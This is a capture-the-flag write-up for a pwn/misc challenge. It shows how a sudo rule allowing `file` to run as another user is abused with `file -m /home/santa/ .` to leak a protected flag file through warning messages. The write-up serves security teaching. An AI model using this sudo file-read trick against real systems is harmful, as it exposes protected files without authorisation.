# Lostpresent - Pwn/misc (200)

Clearly, Santa's elves need some more security training. As a precaution, Santa has limited their sudo access. But is it enough?

Service: ssh -p 1211 shelper@3.81.191.176 (password: shelper)

## Analysis

The challenge description hints at something to do with sudo. Running `sudo -l` we find that we can run a couple different executables as the user `santa` as seen below.

```
shelper@1211_lostpresent:~$ sudo -l
Matching Defaults entries for shelper on 1211_lostpresent:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User shelper may run the following commands on 1211_lostpresent:
    (santa) NOPASSWD: /bin/df *, /bin/fuser *, /usr/bin/file *, /usr/bin/crontab -l, /bin/cat /home/santa/naugtylist
shelper@1211_lostpresent:~$ sudo -u santa /bin/cat /home/santa/naugtylist
                                              zeeedd$$bc
                                            $ " ^""7$$$6$b
                                          .@"  ..     '$$$$       u
                                         :dz@$*-rC"e    $$$   eE" ^$$ d$  .e$$
                                          $*     F@-$L   $$$..$$7. $"d$Lz@$$*
           ...                           z$$$.  $$RJ 3  $$$$$$$"$$"x$$$$$$F"
           $ ""**$L..                  .P* *  **-  $ 'L 4$$$$"J$$2*$$$N$$$
          dF        ^""**N..          d .$ .@C$  ".@.  #dP" 4J$$  '$$$$$$"
        $b$                ^"#**$..   F  ""  *#"*b.*"   3  .J$$     $$$*
        $$"                        #*$$..               4.$$$$$Nr    "L
       $$$                              "#$             $$$$$$$$d    '$b
      @$$F                               J            u$$$$$$$$$$$N..z@
      $$$L                               $          dr$e$$$$$$$$$$$$$e
      $$$P                               P          *$$$$$$$$$$$$P"$
      $$$"                              4"           $$$$$$$$$$$$
      $$F                               $$          $J$$$$$$$$$$
       $                                $F x   :#.d$$$$$$$$$$$$
      $%                                $d$b:$c4$.$$$$$$$$$$$$"
      $                                $$L.$@$$d$$$$$$$$$$$$$F
     :F                                $ ""$$$$$$$$$$$$$$$$$$
     $                                :F$$$L $$$$$$$$$$$$$$$F
     $                                $.$$$$J6C$$$$$$$$$$$$$
    JF                                $$$$ F$$$$$$$$$$$$$$$
    $                                J%$P*$.$$$$$$$$$$$C$*
   4F                                $'**$J$$$C$*$$$$$""$
   $                                4F  .@$$$$$$$$L3*c.$
   $                                @   $$$$$$$$$$$$$$br
  $                                 $   z$$$$$$$$$$N$$$$$
  $                                z"  @$$$$$$$$$$$$$$$$$r
 4F                                $% z$$$$$$$$$$$$$$$$$$$
 $                                .$ 4**e " 9$$$$$$$$$$$$$r
:F                                d"          #* 4$$$$d$*$$
$                                 $                   """"$$$b
$$Neu.                           J$e.e       .             ^L$
4$$$$$$$Nee.                     $$$$$$$$e$"e$Cee..ur       3$
 $$$$$$$$$$$$$$ee..             d$$$$$$$$$$$$$$$$bee$$dCr .d$$
 '""$$$$$$$$$$$$$$$$$$$$c.     4$$$$$$$$$$^$$$$$$$$$$$$$    "
        "#*$$$$$$$$$$$$$$$$$$$N@$$$$$$$$$  '$$$$$$$$$$$$
            '"*$$$$$$$$$$$$$$$$$$$$$$$$$"    $$$$$$$$$$F.
                 ^"**$$$$$*EF$$P$$$$$$$$    J*""*#****""F.
                       '"  J$.  "     "$$   3F         #)
                          '$ELr       4$    ** $Lb@$.dL$#
                           d$$$N$$b$$$P        $$$$$$$$r
                             $$$$$$$$$F        $$$$$$$$F
                             $$$$$$$$$         $$$$$$$$F
                             $$$$$$$$$         $$$$$$$$F
                             $$$$$$$$$         d*$e $$$"

Naughty list: 
	b0bb
	likvidera
	martin
	morla
	semchapeu
	Steven
	wasa
```

After seeing this, its seems like the flag is probably in santa's home directory. However, we can't access it directly with our permissions. Tearing through the options for all of the sudo-allowable commands we find the following for the `file` command in the man page:

```
FILE(1)                   BSD General Commands Manual                  FILE(1)

NAME
     file — determine file type

SYNOPSIS
     file [-bcdEhiklLNnprsvzZ0] [--apple] [--extension] [--mime-encoding]
          [--mime-type] [-e testname] [-F separator] [-f namefile]
          [-m magicfiles] [-P name=value] file ...
     file -C [-m magicfiles]
     file [--help]

...

     -m, --magic-file magicfiles
             Specify an alternate list of files and directories containing
             magic.  This can be a single item, or a colon-separated list.  If
             a compiled magic file is found alongside a file or directory, it
             will be used instead.

```

Since we can specify a source "magic file" directory, lets use that option with santa's home directory to see what happens:

```
shelper@1211_lostpresent:~$ sudo -u santa file -m /home/santa/ .
/home/santa//flag_santas_dirty_secret, 1: Warning: offset `AOTW{SanT4zLiT7L3xm4smag1c}' invalid
/home/santa//naugtylist, 1: Warning: offset `                                              zeeedd$$bc' invalid
/home/santa//naugtylist, 2: Warning: offset `                                            $ " ^""7$$$6$b' invalid
/home/santa//naugtylist, 3: Warning: offset `                                          .@"  ..     '$$$$       u' invalid
/home/santa//naugtylist, 4: Warning: offset `                                         :dz@$*-rC"e    $$$   eE" ^$$ d$  .e$$' invalid
/home/santa//naugtylist, 5: Warning: offset `                                          $*     F@-$L   $$$..$$7. $"d$Lz@$$*' invalid
/home/santa//naugtylist, 6: Warning: offset `           ...                           z$$$.  $$RJ 3  $$$$$$$"$$"x$$$$$$F"' invalid
/home/santa//naugtylist, 7: Warning: offset `           $ ""**$L..                  .P* *  **-  $ 'L 4$$$$"J$$2*$$$N$$$' invalid
/home/santa//naugtylist, 8: Warning: offset `          dF        ^""**N..          d .$ .@C$  ".@.  #dP" 4J$$  '$$$$$$"' invalid
/home/santa//naugtylist, 9: Warning: offset `        $b$                ^"#**$..   F  ""  *#"*b.*"   3  .J$$     $$$*' invalid
/home/santa//naugtylist, 10: Warning: offset `        $$"                        #*$$..               4.$$$$$Nr    "L' invalid
/home/santa//naugtylist, 11: Warning: offset `       $$$                              "#$             $$$$$$$$d    '$b' invalid
/home/santa//naugtylist, 12: Warning: offset `      @$$F                               J            u$$$$$$$$$$$N..z@' invalid
/home/santa//naugtylist, 13: Warning: offset `      $$$L                               $          dr$e$$$$$$$$$$$$$e' invalid
/home/santa//naugtylist, 14: Warning: offset `      $$$P                               P          *$$$$$$$$$$$$P"$' invalid
/home/santa//naugtylist, 15: Warning: offset `      $$$"                              4"           $$$$$$$$$$$$' invalid
/home/santa//naugtylist, 16: Warning: offset `      $$F                               $$          $J$$$$$$$$$$' invalid
/home/santa//naugtylist, 17: Warning: offset `       $                                $F x   :#.d$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 18: Warning: offset `      $%                                $d$b:$c4$.$$$$$$$$$$$$"' invalid
/home/santa//naugtylist, 19: Warning: offset `      $                                $$L.$@$$d$$$$$$$$$$$$$F' invalid
/home/santa//naugtylist, 20: Warning: offset `     :F                                $ ""$$$$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 21: Warning: offset `     $                                :F$$$L $$$$$$$$$$$$$$$F' invalid
/home/santa//naugtylist, 22: Warning: offset `     $                                $.$$$$J6C$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 23: Warning: offset `    JF                                $$$$ F$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 24: Warning: offset `    $                                J%$P*$.$$$$$$$$$$$C$*' invalid
/home/santa//naugtylist, 25: Warning: type `F                                $'**$J$$$C$*$$$$$""$' invalid
/home/santa//naugtylist, 26: Warning: offset `   $                                4F  .@$$$$$$$$L3*c.$' invalid
/home/santa//naugtylist, 27: Warning: offset `   $                                @   $$$$$$$$$$$$$$br' invalid
/home/santa//naugtylist, 28: Warning: offset `  $                                 $   z$$$$$$$$$$N$$$$$' invalid
/home/santa//naugtylist, 29: Warning: offset `  $                                z"  @$$$$$$$$$$$$$$$$$r' invalid
/home/santa//naugtylist, 30: Warning: type `F                                $% z$$$$$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 31: Warning: offset ` $                                .$ 4**e " 9$$$$$$$$$$$$$r' invalid
/home/santa//naugtylist, 32: Warning: offset `:F                                d"          #* 4$$$$d$*$$' invalid
/home/santa//naugtylist, 33: Warning: offset `$                                 $                   """"$$$b' invalid
/home/santa//naugtylist, 34: Warning: offset `$$Neu.                           J$e.e       .             ^L$' invalid
/home/santa//naugtylist, 35: Warning: type `$$$$$$$Nee.                     $$$$$$$$e$"e$Cee..ur       3$' invalid
/home/santa//naugtylist, 36: Warning: offset ` $$$$$$$$$$$$$$ee..             d$$$$$$$$$$$$$$$$bee$$dCr .d$$' invalid
/home/santa//naugtylist, 37: Warning: offset ` '""$$$$$$$$$$$$$$$$$$$$c.     4$$$$$$$$$$^$$$$$$$$$$$$$    "' invalid
/home/santa//naugtylist, 38: Warning: offset `        "#*$$$$$$$$$$$$$$$$$$$N@$$$$$$$$$  '$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 39: Warning: offset `            '"*$$$$$$$$$$$$$$$$$$$$$$$$$"    $$$$$$$$$$F.' invalid
/home/santa//naugtylist, 40: Warning: offset `                 ^"**$$$$$*EF$$P$$$$$$$$    J*""*#****""F.' invalid
/home/santa//naugtylist, 41: Warning: offset `                       '"  J$.  "     "$$   3F         #)' invalid
/home/santa//naugtylist, 42: Warning: offset `                          '$ELr       4$    ** $Lb@$.dL$#' invalid
/home/santa//naugtylist, 43: Warning: offset `                           d$$$N$$b$$$P        $$$$$$$$r' invalid
/home/santa//naugtylist, 44: Warning: offset `                             $$$$$$$$$F        $$$$$$$$F' invalid
/home/santa//naugtylist, 45: Warning: offset `                             $$$$$$$$$         $$$$$$$$F' invalid
/home/santa//naugtylist, 46: Warning: offset `                             $$$$$$$$$         $$$$$$$$F' invalid
/home/santa//naugtylist, 47: Warning: offset `                             $$$$$$$$$         d*$e $$$"' invalid
/home/santa//naugtylist, 49: Warning: offset `Naughty list: ' invalid
/home/santa//naugtylist, 50: Warning: offset `	b0bb' invalid
/home/santa//naugtylist, 51: Warning: offset `	likvidera' invalid
/home/santa//naugtylist, 52: Warning: offset `	martin' invalid
/home/santa//naugtylist, 53: Warning: offset `	morla' invalid
/home/santa//naugtylist, 54: Warning: offset `	semchapeu' invalid
/home/santa//naugtylist, 55: Warning: offset `	Steven' invalid
/home/santa//naugtylist, 56: Warning: offset `	wasa' invalid
file: could not find any valid magic files!
```

And of course this gives us the flag in `flag_santas_dirty_secret`
